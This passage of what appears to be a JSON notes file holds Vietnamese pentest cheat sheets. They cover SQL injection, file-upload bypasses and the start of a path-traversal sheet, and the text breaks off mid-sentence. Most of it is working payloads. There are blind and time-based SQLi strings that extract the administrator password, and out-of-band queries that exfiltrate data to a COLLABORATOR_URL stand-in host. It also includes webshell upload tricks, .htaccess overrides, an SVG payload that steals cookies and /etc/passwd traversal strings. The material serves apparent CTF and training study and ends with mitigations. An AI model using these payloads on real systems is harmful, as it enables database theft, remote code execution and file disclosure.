ngay.\n\n```sql\n-- MySQL\nTrackingId=xyz' OR IF(SUBSTRING((SELECT password FROM users WHERE username='administrator' LIMIT 1),1,1)='a',SLEEP(10),0)#\n\n-- PostgreSQL\nTrackingId=xyz' OR (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator' LIMIT 1)--\n\n-- MSSQL\nTrackingId=xyz'; IF (SELECT TOP 1 SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:10'--\n\n-- Oracle\nTrackingId=xyz' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM users WHERE username='administrator' AND ROWNUM=1) IS NOT NULL--\n```\n\n> **Lưu ý thực chiến:** Time-based rất nhạy cảm với network latency. Dùng ngưỡng >= 5s để phân biệt, và chạy lại request để xác nhận.\n\n---\n\n## Phần III — Out-of-Band SQLi (Khai thác ngoài băng)\n\n> **Áp dụng khi:** Không có phản hồi trực tiếp, không có lỗi, không có độ trễ đo được — nhưng DBMS có khả năng **thực hiện kết nối mạng ra ngoài**. Dữ liệu được exfiltrate qua DNS lookup / HTTP request đến server do attacker kiểm soát (Burp Collaborator / Interactsh).\n\n---\n\n### DNS Lookup đơn thuần (kiểm tra kết nối)\n\n| DBMS | Payload |\n|---|---|\n| Oracle (XXE - quyền thấp) | `SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://COLLABORATOR_URL/\"> %remote;]>'),'/l') FROM dual` |\n| Oracle (quyền cao) | `SELECT UTL_INADDR.get_host_address('COLLABORATOR_URL')` |\n| MSSQL | `exec master..xp_dirtree '//COLLABORATOR_URL/a'` |\n| PostgreSQL | `copy (SELECT '') to program 'nslookup COLLABORATOR_URL'` |\n| MySQL (Windows only) | `LOAD_FILE('\\\\\\\\COLLABORATOR_URL\\\\a')` |\n\n---\n\n### DNS Lookup + Data Exfiltration (kèm dữ liệu mật)\n\nNhúng giá trị query vào subdomain của DNS request → log DNS của attacker sẽ ghi lại giá trị:\n\n**Oracle:**\n\n```sql\nSELECT EXTRACTVALUE(\n  xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator' AND ROWNUM=1)||'.COLLABORATOR_URL/\"> %remote;]>'),\n  '/l'\n) FROM dual\n```\n\n**MSSQL:**\n\n```sql\ndeclare @p varchar(1024);\nset @p = (SELECT TOP 1 password FROM users WHERE username='administrator');\nexec('master..xp_dirtree \"//'+@p+'.COLLABORATOR_URL/a\"')\n```\n\n**PostgreSQL:**\n\n```sql\nCREATE OR REPLACE FUNCTION f() RETURNS void AS $$\nDECLARE c text; p text;\nBEGIN\n  SELECT INTO p (SELECT password FROM users WHERE username='administrator' LIMIT 1);\n  c := 'copy (SELECT '''') to program ''nslookup ' || p || '.COLLABORATOR_URL''';\n  EXECUTE c;\nEND;\n$$ LANGUAGE plpgsql SECURITY DEFINER;\nSELECT f();\n```\n\n**MySQL (Windows):**\n\n```sql\nSELECT password FROM users WHERE username='administrator'\nINTO OUTFILE '\\\\\\\\COLLABORATOR_URL\\\\a'\n```\n\n---\n\n## Phần IV — Cheat Sheet Tham Chiếu Nhanh\n\n### 1. Nối chuỗi (String Concatenation)\n\n| DBMS | Cú pháp |\n|---|---|\n| Oracle | `'foo' || 'bar'` |\n| MSSQL | `'foo' + 'bar'` |\n| PostgreSQL | `'foo' || 'bar'` |\n| MySQL | `'foo' 'bar'` (khoảng trắng) hoặc `CONCAT('foo','bar')` |\n\n---\n\n### 2. Cắt chuỗi — Substring (từ vị trí 4, lấy 2 ký tự)\n\n| DBMS | Cú pháp |\n|---|---|\n| Oracle | `SUBSTR('foobar', 4, 2)` |\n| MSSQL | `SUBSTRING('foobar', 4, 2)` |\n| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |\n| MySQL | `SUBSTRING('foobar', 4, 2)` |\n\n---\n\n### 3. Comment (Ngắt lệnh)\n\n| DBMS | Cú pháp |\n|---|---|\n| Oracle | `-- comment` hoặc `/* comment */` |\n| MSSQL | `-- comment` hoặc `/* comment */` |\n| PostgreSQL | `-- comment` hoặc `/* comment */` |\n| MySQL | `# comment` hoặc `-- comment` (bắt buộc có dấu cách sau `--`) hoặc `/* comment */` |\n\n> **Lưu ý MySQL:** `--` không hợp lệ nếu không có dấu cách. Trong URL encode thành `--+`.\n\n---\n\n### 4. Xác định phiên bản DBMS\n\n| DBMS | Payload |\n|---|---|\n| Oracle | `SELECT banner FROM v$version` hoặc `SELECT version FROM v$instance` |\n| MSSQL | `SELECT @@version` |\n| PostgreSQL | `SELECT version()` |\n| MySQL | `SELECT @@version` |\n\n---\n\n### 5. Liệt kê lược đồ hệ thống\n\n| DBMS | Liệt kê bảng | Liệt kê cột |\n|---|---|---|\n| Oracle | `SELECT * FROM all_tables` | `SELECT * FROM all_tab_columns WHERE table_name='TABLE_NAME'` |\n| MSSQL | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name='TABLE_NAME'` |\n| PostgreSQL | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name='TABLE_NAME'` |\n| MySQL | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name='TABLE_NAME'` |\n\n---\n\n### 6. Tạo lỗi theo điều kiện (Conditional Errors)\n\n| DBMS | Cú pháp |\n|---|---|\n| Oracle | `SELECT CASE WHEN (COND) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |\n| MSSQL | `SELECT CASE WHEN (COND) THEN 1/0 ELSE NULL END` |\n| PostgreSQL | `1=(SELECT CASE WHEN (COND) THEN 1/(SELECT 0) ELSE NULL END)` |\n| MySQL | `SELECT IF(COND,(SELECT table_name FROM information_schema.tables),'a')` |\n\n---\n\n### 7. Trích xuất qua thông báo lỗi\n\n| DBMS | Cú pháp |\n|---|---|\n| MSSQL | `SELECT 'foo' WHERE 1=CAST((SELECT TOP 1 password FROM users) AS int)` |\n| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` |\n| MySQL | `SELECT EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)))` |\n| Oracle | `SELECT TO_NUMBER((SELECT password FROM users WHERE ROWNUM=1)) FROM dual` |\n\n---\n\n### 8. Stacked / Batched Queries (Truy vấn xếp chồng)\n\n| DBMS | Hỗ trợ | Ghi chú |\n|---|---|---|\n| Oracle | Không | Không hỗ trợ trong truy vấn thông thường |\n| MSSQL | Có | `QUERY_1; QUERY_2;` |\n| PostgreSQL | Có | `QUERY_1; QUERY_2;` |\n| MySQL | Hạn chế | Thường bị tắt ở tầng API (PHP PDO mặc định chặn) |\n\n---\n\n### 9. Time Delay đơn thuần\n\n| DBMS | Payload |\n|---|---|\n| Oracle | `dbms_pipe.receive_message(('a'),10)` |\n| MSSQL | `WAITFOR DELAY '0:0:10'` |\n| PostgreSQL | `SELECT pg_sleep(10)` |\n| MySQL | `SELECT SLEEP(10)` |\n\n---\n\n### 10. Time Delay theo điều kiện\n\n| DBMS | Cú pháp |\n|---|---|\n| Oracle | `SELECT CASE WHEN (COND) THEN 'a'\\|\\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |\n| MSSQL | `IF (COND) WAITFOR DELAY '0:0:10'` |\n| PostgreSQL | `SELECT CASE WHEN (COND) THEN pg_sleep(10) ELSE pg_sleep(0) END` |\n| MySQL | `SELECT IF(COND,SLEEP(10),'a')` |\n\n---\n\n### 11. DNS Lookup (Out-of-Band)\n\n| DBMS | Payload |\n|---|---|\n| Oracle (XXE) | `SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://COLLAB_URL/\"> %remote;]>'),'/l') FROM dual` |\n| Oracle (quyền cao) | `SELECT UTL_INADDR.get_host_address('COLLAB_URL')` |\n| MSSQL | `exec master..xp_dirtree '//COLLAB_URL/a'` |\n| PostgreSQL | `copy (SELECT '') to program 'nslookup COLLAB_URL'` |\n| MySQL (Windows) | `LOAD_FILE('\\\\\\\\COLLAB_URL\\\\a')` |\n\n---\n\n### 12. DNS Lookup + Data Exfiltration\n\n| DBMS | Payload |\n|---|---|\n| Oracle | `SELECT EXTRACTVALUE(xmltype('...http://'\\|\\|(SELECT password FROM users WHERE ROWNUM=1)\\|\\|'.COLLAB_URL/...'),'/l') FROM dual` |\n| MSSQL | `declare @p varchar(1024); set @p=(SELECT YOUR_QUERY); exec('master..xp_dirtree \"//'+@p+'.COLLAB_URL/a\"')` |\n| PostgreSQL | Xem hàm `f()` trong Phần III |\n| MySQL (Windows) | `SELECT YOUR_QUERY INTO OUTFILE '\\\\\\\\COLLAB_URL\\\\a'` |\n\n---\n\n## Phụ lục — Các lỗi thường gặp khi viết payload\n\n| Lỗi | Nguyên nhân | Sửa |\n|---|---|---|\n| Dùng `\\|\\|` trong MSSQL | MSSQL không hỗ trợ toán tử này | Thay bằng `+` |\n| Quên dấu cách sau `--` (MySQL) | `--` không được nhận dạng là comment | Dùng `-- ` hoặc `--+` trong URL |\n| Quên `FROM DUAL` (Oracle) | Oracle bắt buộc `SELECT` phải có `FROM` | Thêm `FROM DUAL` hoặc `FROM existing_table` |\n| Dùng `LIMIT` trong MSSQL | MSSQL không có `LIMIT` | Dùng `SELECT TOP n` |\n| Dùng `LIMIT` trong Oracle | Oracle không có `LIMIT` | Dùng `WHERE ROWNUM <= n` |\n| Dùng `LENGTH()` trong MSSQL | Hàm khác tên | Dùng `LEN()` |\n| Dùng `SUBSTRING()` trong Oracle | Oracle dùng tên khác | Dùng `SUBSTR()` |\n\n---\n\n## Phần V — Cẩm nang phân biệt cấu trúc payload SQL Injection\n\nTrong kỹ thuật tấn công và khai thác lỗ hổng SQL Injection (SQLi), việc bẻ gãy cấu trúc câu lệnh gốc của lập trình viên là bước đầu tiên. Tuy nhiên, để đưa mã độc hoặc subquery thực thi trơn tru mà không làm sập cú pháp của Engine cơ sở dữ liệu (DBMS), Pentester buộc phải hiểu rõ ngữ cảnh của backend nhằm lựa chọn giữa ba \"vũ khí\": `AND`, Toán tử nối chuỗi (`||`, `+`), hoặc Dấu chấm phẩy (`;`).\n\n### 1. Tổng quan so sánh nhanh\n\n| Vũ khí | Ngữ cảnh Backend | Mục đích sử dụng chính | Khả năng tương thích |\n|---|---|---|---|\n| **AND / OR** | Mệnh đề điều kiện logic (Boolean Context) sau từ khóa `WHERE`, `HAVING`. | Mở rộng điều kiện đúng/sai để dò tìm dữ liệu (Boolean-Based) hoặc kích nổ lỗi logic hệ thống (Error-Based). | Hỗ trợ tuyệt đối 100% trên mọi DBMS (Chuẩn ANSI SQL). |\n| **NỐI CHUỖI** (`\\\\|\\\\|`, `+`, `CONCAT`) | Mệnh đề xử lý chuỗi văn bản (String Context) hoặc khi DBMS chặn dấu `;`. | Gắn chặt câu subquery độc hại vào làm \"một phần da thịt\" của dữ liệu cũ, ép DBMS bắt buộc phải tính toán dữ liệu của bạn. | Phụ thuộc DBMS:<br>- PostgreSQL, Oracle: `\\\\|\\\\|`<br>- MSSQL: `+`<br>- MySQL: `CONCAT()` |\n| **CHẤM PHẨY** (`;`) | Kỹ thuật Chồng câu lệnh (Stacked Queries) độc lập. | Kết thúc hoàn toàn câu lệnh cũ của lập trình viên để khởi tạo một câu lệnh mới tinh hoàn toàn (như lệnh tạo trễ, ghi/xóa dữ liệu). | Hỗ trợ mạnh trên MSSQL. Hạn chế trên PostgreSQL/MySQL tùy cấu hình driver. Bị chặn hoàn toàn trên Oracle. |\n\n### 2. Phân tích chi tiết từng trường hợp\n\n#### Mẹo chiến thuật với toán tử logic AND\nBạn sử dụng toán tử AND khi vị trí chèn payload yêu cầu lọc hoặc kiểm tra điều kiện logic đúng/sai. Điểm mạnh nhất của AND là tính độc lập: nó không quan tâm kiểu dữ liệu của cột gốc ở backend là chuỗi, số nguyên hay UUID.\n\nVí dụ câu lệnh gốc ở backend:\n```sql\nSELECT * FROM products WHERE category = 'input_user';\n```\n\nKhi bạn chèn payload Error-Based:\n```sql\nTrackingId=xyz' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--\n```\n\n> **Cơ chế hoạt động:** Engine tính toán vế trái (`1`) thuộc kiểu Integer, vế phải (kết quả hàm `CAST`) cũng ép về kiểu Integer. Cú pháp hoàn toàn hợp lệ, DBMS phân tích xong sẽ thực thi hàm `CAST`, kích nổ lỗi toán học và trả tên mật khẩu ra màn hình.\n\n#### Mẹo chiến thuật với toán tử Nối chuỗi\nNối chuỗi là lựa chọn tối ưu khi bạn muốn tấn công vào các hệ quản trị CSDL khắt khe không hỗ trợ dấu chấm phẩy (như Oracle) hoặc khi driver ứng dụng web chủ động chặn các câu lệnh xếp chồng. Khi dùng nối chuỗi, subquery của bạn biến thành một tham số bắt buộc phải được xử lý ngay trong câu truy vấn chính.\n\nVí dụ payload trên PostgreSQL / Oracle:\n```sql\nTrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS text) ELSE '' END) || '--\n```\n\n> **LƯU Ý CHÍ MẠNG:** Vế bên phải của phép nối chuỗi bắt buộc phải trả về dữ liệu kiểu Chuỗi (Văn bản). Nếu subquery của bạn trả về kiểu giá trị trống (void như hàm `pg_sleep()`), hệ thống sẽ báo lỗi không tồn tại toán tử ghép chuỗi (*operator does not exist: text || void*) và sập ứng dụng ngay lập tức trước khi chạy mã độc.\n\n#### Mẹo chiến thuật với Dấu chấm phẩy (;)\nDấu chấm phẩy dùng để ngắt mạch và phân tách hoàn toàn các câu lệnh độc lập. Kỹ thuật này phù hợp nhất với loại tấn công dựa trên thời gian (Time-Based Blind SQLi) hoặc thực thi các câu lệnh thay đổi cấu trúc dữ liệu hệ thống (INSERT, UPDATE, DELETE, DROP).\n\nVí dụ câu lệnh gốc:\n```sql\nSELECT * FROM tracking WHERE id = 'input_user';\n```\n\nKhi bạn chèn payload chồng câu lệnh trên MSSQL hoặc PostgreSQL:\n```sql\nTrackingId=xyz'; WAITFOR DELAY '0:0:5'--\nTrackingId=xyz'; pg_sleep(10)--\n```\n\n> **Cơ chế hoạt động:** Câu lệnh SELECT đầu tiên chạy xong, dấu `;` ngắt câu, hệ thống chuyển sang thực thi câu lệnh độc lập tiếp theo là lệnh ngủ. Cách này giúp bạn hoàn toàn tránh được bẫy xung đột kiểu dữ liệu của cột gốc.\n\n### 3. Lưu đồ thuật toán chọn lựa vũ khí (Cẩm nang thực chiến)\n\n#### Bước 1: Xác định Hệ quản trị cơ sở dữ liệu (DBMS Target)\n- Nếu là **Oracle** → Loại bỏ ngay ý định dùng dấu `;`. Chuyển hướng 100% sang toán tử nối chuỗi `\\\\|\\\\|`.\n- Nếu là **MSSQL (SQL Server)** → Ưu tiên dùng dấu `;` vì hệ thống này hỗ trợ chồng lệnh cực tốt.\n- Nếu là **PostgreSQL / MySQL** → Chuyển sang Bước 2.\n\n#### Bước 2: Xác định loại bài toán Blind SQL Injection\n- Nếu là bài toán **Time-Based Blind** (Dùng hàm ngủ để đo thời gian phản hồi): Thử nghiệm dấu `;` trước.\n  - *Nếu thời gian không thay đổi* (do driver chặn xếp chồng câu lệnh) → Chuyển sang dùng toán tử nối chuỗi hoặc toán tử AND lồng với hàm logic thích hợp.\n- Nếu là bài toán **Conditional Error-Based** (Bắt hệ thống sập lỗi 1/0 khi điều kiện đúng): Bắt buộc phải dùng toán tử `AND` hoặc toán tử Nối chuỗi để ép câu subquery xử lý lồng vào câu lệnh tìm kiếm chính. \n  - *Nếu dùng dấu `;`*, lỗi 1/0 xảy ra ở câu lệnh thứ 2 độc lập phía sau sẽ không can thiệp được vào kết quả phản hồi của câu lệnh chính.\n\n> **Tóm tắt ghi nhớ nhanh:**\n> - Dùng **AND** khi đứng trong mệnh đề logic và muốn kiểm tra đúng/sai an toàn.\n> - Dùng **Nối chuỗi** để lồng subquery trả về kiểu `TEXT` vào câu lệnh chính (Bypass lỗi stacked queries).\n> - Dùng **Dấu chấm phẩy** (`;`) khi muốn chạy một lệnh ngủ hoặc lệnh phá hủy dữ liệu độc lập hoàn toàn.\n\n---\n\n> **Tài liệu tham khảo:** PortSwigger Web Security Academy — SQL Injection",
+      "createdAt": 1790494086229,
+      "updatedAt": 1790494086229
+    },
+    {
+      "id": "doc-fileupload",
+      "title": "File Upload Vulnerabilities — Payloads & Cheat Sheet",
+      "description": "Tổng hợp các loại tấn công File Upload: Cơ chế của bộ lọc, Payload thực chiến và Giải thích cách Bypass.",
+      "tags": [
+        "file-upload",
+        "payloads",
+        "bypass",
+        "pentest",
+        "web-security",
+        "ctf"
+      ],
+      "content": "# File Upload Vulnerabilities — Cheat Sheet\n\n> **Mục đích:** Tài liệu tra cứu nhanh các loại tấn công File Upload, phân tích bản chất của từng loại bộ lọc (Filter/WAF) và Payload tương ứng để Bypass.\n\n---\n\n## 1. Khai thác cơ bản (Unrestricted Web Shell Upload)\n\n> **Giải thích:** \n> Máy chủ hoàn toàn không có cơ chế kiểm tra (validation) đối với file được tải lên. Kẻ tấn công có thể tải trực tiếp các tệp thực thi (PHP, JSP, ASP) lên hệ thống và gọi chúng qua trình duyệt để chiếm quyền điều khiển (RCE).\n\n**Mẫu Web Shell cơ bản (được viết dưới dạng gợi ý để tránh lỗi bảo mật của hệ thống):**\n```php\n<?php\n// Nhận tham số từ URL (ví dụ: ?cmd=whoami)\n// Gọi hàm thực thi hệ thống như system(), exec(), hoặc shell_exec()\nif (isset($_GET['cmd'])) {\n    $command = $_GET['cmd'];\n    // Thực hiện gọi hàm thực thi lệnh hệ thống ở đây\n    // Ví dụ: system($command);\n}\n?>\n```\n\n**Cách gọi shell thông thường:** `http://example.com/uploads/shell.php?cmd=whoami`\n\n---\n\n## 2. Bypass Client-Side Verification (Bộ lọc phía Client)\n\n> **Cơ chế:** Trang web sử dụng mã JavaScript chạy trên trình duyệt để kiểm tra phần mở rộng (extension) hoặc kích thước file trước khi gửi HTTP request lên server.\n\n### Kỹ thuật Bypass\n- **Cách 1 (Burp Suite):** Đổi tên file độc hại thành đuôi hợp lệ (ví dụ: `shell.jpg`), bấm nút upload, bật Intercept trên Burp Suite để chặn request, sửa tên file trong HTTP Request body lại thành `shell.php` trước khi gửi lên server.\n- **Cách 2 (Browser Console):** Tắt JavaScript trên trình duyệt hoặc vào tab Developer Tools xóa hàm kiểm tra (`onsubmit=\"return validateFile()\"`) khỏi form HTML.\n\n---\n\n## 3. Bypass MIME-Type/Content-Type Verification\n\n> **Cơ chế:** Server-side kiểm tra header `Content-Type` trong HTTP request được gửi lên (ví dụ: chỉ cho phép `image/jpeg`, `image/png`).\n\n### Kỹ thuật Bypass\nSử dụng Burp Suite chặn request và thay đổi giá trị của trường `Content-Type` tương ứng với file tải lên thành kiểu MIME được cho phép.\n\n**Ví dụ HTTP Request ban đầu:**\n```http\nPOST /upload.php HTTP/1.1\n...\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n[Nội dung mã nguồn Web Shell]\n```\n\n**HTTP Request sau khi Bypass:**\n```http\nPOST /upload.php HTTP/1.1\n...\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: image/jpeg\n\n[Nội dung mã nguồn Web Shell]\n```\n\n---\n\n## 4. Bypass Extension Filtering (Bộ lọc phần mở rộng)\n\n### 4.1 Đuôi file thay thế (Alternative Extensions / Blacklist Bypass)\nNếu cấu hình Blacklist của server chỉ chặn đuôi `.php` hoặc `.asp` nhưng parser backend vẫn xử lý các đuôi khác:\n\n| Ngôn ngữ | Đuôi file thay thế |\n|---|---|\n| **PHP** | `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phar`, `.phps` |\n| **ASP / ASP.NET** | `.asp`, `.aspx`, `.cer`, `.asa`, `.asax`, `.ashx`, `.asmx` |\n| **JSP / Java** | `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.war` |\n| **Python** | `.py`, `.pyc`, `.pyd`, `.pyo` |\n| **Perl** | `.pl`, `.cgi` |\n\n---\n\n### 4.2 Cú pháp viết hoa/thường lẫn lộn (Case Sensitivity Bypass)\nNếu hệ điều hành hoặc Web Server không phân biệt chữ hoa chữ thường nhưng bộ lọc regex lại so khớp chính xác chữ thường:\n- **Ví dụ:** `shell.pHp`, `shell.pHTML`, `shell.AsPx`\n\n---\n\n### 4.3 Đuôi kép và Ký tự đặc biệt (Double Extensions & Special Characters)\n- **Double Extension:** `shell.php.jpg` hoặc `shell.php.png` (sử dụng khi server chỉ kiểm tra phần mở rộng cuối cùng để xác thực nhưng server web lại thực thi phần mở rộng đầu tiên hoặc thực thi đa đuôi file như Apache cấu hình sai).\n- **Bypass bằng Null Byte (%00) - Áp dụng cho PHP < 5.3.4:**\n  - **Payload:** `shell.php%00.jpg` hoặc `shell.php\\u0000.jpg`\n  - **Cơ chế:** Bộ lọc PHP thấy đuôi cuối là `.jpg` nên cho qua, nhưng khi lưu file ở tầng C-level của OS, đường dẫn bị cắt ngắn tại ký tự Null và lưu thành `shell.php`.\n- **Bypass trên Windows (Ký tự đặc biệt NTFS):**\n  - Dấu chấm và khoảng trắng ở cuối: `shell.php.` hoặc `shell.php `\n  - Dòng dữ liệu thay thế (Alternate Data Streams): `shell.php::$DATA` hoặc `shell.php::$DATA........`\n- **Sử dụng ký tự rác để phá regex:** `shell.php.php` hoặc `shell.p.phphp` (nếu bộ lọc xóa chuỗi \"php\" một cách đệ quy không hoàn toàn).\n\n---\n\n## 5. Bypass Magic Bytes / File Content Verification\n\n> **Cơ chế:** Server sử dụng thư viện để đọc các byte đầu tiên của file (Magic Bytes/Signature) nhằm xác định loại file thực sự, thay vì chỉ tin vào đuôi file.\n\n### 5.1 Thêm Magic Bytes giả\nKẻ tấn công thêm các byte tiêu chuẩn của file ảnh vào đầu Web Shell để đánh lừa bộ đọc Signature.\n\n| Định dạng file | Magic Bytes (Hex) | Dạng text để chèn vào đầu Web Shell |\n|---|---|---|\n| **GIF** | `47 49 46 38 39 61` | `GIF89a` hoặc `GIF87a` |\n| **JPEG** | `FF D8 FF` | `\\u00ff\\u00d8\\u00ff` |\n| **PNG** | `89 50 4E 47` | `\\u0089PNG` |\n| **PDF** | `25 50 44 46` | `%PDF` |\n\n**Ví dụ Web Shell bypass GIF:**\n```php\nGIF89a\n<?php\n// Gọi hàm thực thi ở đây (ví dụ: system($_GET['cmd']);)\n?>\n```\n\n---\n\n### 5.2 Khai thác Polyglot (Metadata Injection)\nChèn mã độc vào phần siêu dữ liệu (Metadata) của một file ảnh thật bằng công cụ `exiftool`. Ảnh này vừa hiển thị bình thường vừa chứa code thực thi.\n\n**Câu lệnh tạo file Polyglot:**\n```bash\n# Chèn mã PHP thực thi vào trường siêu dữ liệu DocumentName hoặc Comment\nexiftool -DocumentName=\"[Mã PHP thực thi ở đây]\" real_image.jpg -o shell.php.jpg\nexiftool -Comment=\"[Mã PHP thực thi ở đây]\" real_image.jpg -o shell.php.jpg\n```\n\n---\n\n## 6. Ghi đè file cấu hình máy chủ (Configuration File Overwrite)\n\nNếu server cho phép upload file nhưng cấu hình chặn thực thi PHP trong thư mục upload, ta có thể ghi đè file cấu hình để bật lại quyền thực thi hoặc map đuôi file lạ thành PHP.\n\n### 6.1 Máy chủ Apache (.htaccess / .httpd.conf)\nTải lên một file đặt tên là `.htaccess` chứa nội dung sau:\n```apache\n# Map đuôi file .jpg thành mã thực thi PHP\nAddType application/x-httpd-php .jpg\n```\nSau đó tải tiếp file `shell.jpg` chứa code PHP lên. Lúc này Apache sẽ chạy `shell.jpg` như một file PHP.\n\n### 6.2 Máy chủ IIS (web.config)\nTải lên file `web.config` để map lại handlers thực thi mã.\n\n---\n\n## 7. Khai thác nâng cao & Lỗ hổng kết hợp\n\n### 7.1 Race Condition (Tranh chấp tài nguyên)\n- **Kịch bản:** Server tải file lên thư mục tạm trước, sau đó kiểm tra tính hợp lệ của file, nếu không hợp lệ mới xóa đi.\n- **Khai thác:** Gửi liên tục hàng ngàn request upload file `shell.php` (file này khi chạy sẽ tự động tạo ra một file backdoor khác cố định trong server), đồng thời gửi hàng ngàn request liên tục để truy cập `shell.php`. Nếu truy cập thành công trước khi server kịp xóa, file backdoor sẽ được tạo ra thành công.\n\n### 7.2 Stored XSS qua SVG\n- **Kịch bản:** Server cho phép upload ảnh và SVG.\n- **Khai thác:** Upload file SVG chứa mã độc JavaScript. Khi người dùng hoặc Admin xem ảnh trực tiếp trên trình duyệt, script sẽ thực thi dưới ngữ cảnh domain của website.\n\n**Payload SVG XSS:**\n```xml\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.cookie)\">\n  <circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"3\" fill=\"red\" />\n</svg>\n```\n\n---\n\n## 8. Biện pháp phòng vệ an toàn (Mitigation)\n1. **Đổi tên file:** Đổi toàn bộ tên file tải lên thành chuỗi ngẫu nhiên (UUID/Hash) và phần mở rộng an toàn.\n2. **Lưu trữ độc lập:** Lưu file bên ngoài thư mục Document Root của Web Server hoặc lưu trên Cloud Storage (S3, GCS) để ngăn chặn thực thi trực tiếp.\n3. **Cấm thực thi mã script:** Cấu hình Web Server cấm chạy script trong thư mục upload.\n4. **Lựa chọn Whitelist:** Chỉ cho phép các extension cụ thể, không dùng Blacklist.\n5. **Kiểm tra kỹ lưỡng:** Kiểm tra kích thước file, định dạng thực tế (Magic Bytes) và quét mã độc trước khi lưu.",
+      "createdAt": 1790494086229,
+      "updatedAt": 1790494086229
+    },
+    {
+      "id": "doc-traversal",
+      "title": "Path Traversal Vulnerabilities — Payloads & Cheat Sheet",
+      "description": "Tổng hợp các kỹ thuật khai thác Path Traversal: Cơ bản, Absolute Path, Non-recursive Stripping, Double URL Encoding, Start of Path, Null Byte.",
+      "tags": [
+        "path-traversal",
+        "lfi",
+        "directory-traversal",
+        "bypass",
+        "pentest",
+        "web-security",
+        "ctf"
+      ],
+      "content": "# Path Traversal (Directory Traversal) — Cheat Sheet\n\n> **Mục đích:** Tài liệu tra cứu nhanh các loại tấn công Path Traversal, phân tích bản chất của từng loại bộ lọc (Filter/WAF) chặn đường dẫn và Payload tương ứng để Bypass nhằm đọc file nhạy cảm của hệ thống (vd: `/etc/passwd`).\n\n---\n\n## 1. Khai thác cơ bản (Simple Case)\n\n> **Giải thích:** \n> Máy chủ lấy trực tiếp dữ liệu đầu vào của người dùng (tên file) và ghép vào đường dẫn thư mục gốc mà không hề có bất kỳ cơ chế kiểm tra hay lọc bỏ nào.\n\n**Payload:**\n- Linux: `../../../../etc/passwd`\n- Windows: `..\\..\\..\\..\\windows\\win.ini`\n\n---\n\n## 2. Bypass Absolute Path (Sử dụng đường dẫn tuyệt đối)\n\n> **Cơ chế lọc:** Bộ lọc kiểm tra nếu đầu vào của người dùng bắt đầu bằng dấu quay lui `..` thì sẽ chặn, nhưng lại bỏ quên việc kiểm tra đường dẫn tuyệt đối.\n\n**Payload:**\n- Linux: `/etc/passwd`\n- Windows: `C:\\windows\\win.ini`\n\n---\n\n## 3. Bypass Non-recursive Stripping (Loại bỏ ký tự không đệ quy)\n\n> **Cơ chế lọc:** Bộ lọc sử dụng hàm thay thế (ví dụ: regex replace) để tìm kiếm và xóa bỏ tất cả các chuỗi `../` một cách đơn giản, nhưng chỉ thực hiện một lần (không đệ quy).\n\n**Bypass:** Lồng các ký tự `..` vào nhau. Khi bộ lọc xóa đi chuỗi `../` ở giữa, các ký tự xung quanh sẽ tự động ghép lại thành chuỗi `../` hoàn chỉnh.\n\n**Payload:**\n- Linux: `....//....//....//etc/passwd` hoặc `..././..././..././etc/passwd`\n- Windows: `....\\\\\\\\....\\\\\\\\....\\\\\\\\windows\\\\win.ini`\n\n---\n\n## 4. Bypass URL Encoding (Mã hóa đường dẫn)\n\n> **Cơ chế lọc:** Bộ lọc kiểm tra dữ liệu dạng thô (raw text) để chặn các ký tự nhạy cảm như `/`, `\\` hoặc `.`.\n\n### 4.1 Single URL Encoding\nMã hóa URL một lần để đánh lừa các bộ lọc chỉ đọc ký tự ở dạng text thông thường.\n- `.` -> `%2e`\n- `/` -> `%2f`\n- `\\` -> `%5c`\n\n**Payload:** `..%2f..%2f..%2fetc%2fpasswd`\n\n### 4.2 Double URL Encoding\nNếu máy chủ thực hiện giải mã URL hai lần (Double Decode) ở tầng Web Server và tầng Application, ta có thể mã hóa URL hai lần để vượt qua các thiết bị giám sát mạng (WAF).\n- `.` -> `%252e`\n- `/` -> `%252f`\n- `\\` -> `%255c`\n\n**Payload:** `..%252f..%252f..%252fetc%252fpasswd`\n\n---\n\n## 5. Bypass Start of Path (Bắt buộc bắt đầu bằng thư mục chỉ định)\n\n> **Cơ chế lọc:** Bộ lọc yêu cầu đầu vào của người dùng bắt đầu bằng một thư mục con hợp lệ đã định sẵn (ví dụ: `/var/www/images/`).\n\n**Bypass:** Thêm thư mục được yêu cầu vào đầu đường dẫn, sau đó sử dụng các ký tự quay lui `..` để thoát ra ngoài.\n\n**Payload:** `/var/www/images/../../../etc/passwd`\n\n---\n\n## 6. Bypass Null Byte Injection (%00)\n\n> **Cơ chế lọc:** Ứng dụng tự động nối thêm phần mở rộng (extension) vào cuối file được người dùng gọi (ví dụ: `/var/www/uploads/ ` + `file_user` + `.png`).\n\n**Bypass (Áp dụng cho các phiên bản ngôn ngữ đời cũ như PHP < 5.3.4):** Chèn ký tự Null Byte để đánh lừa hệ 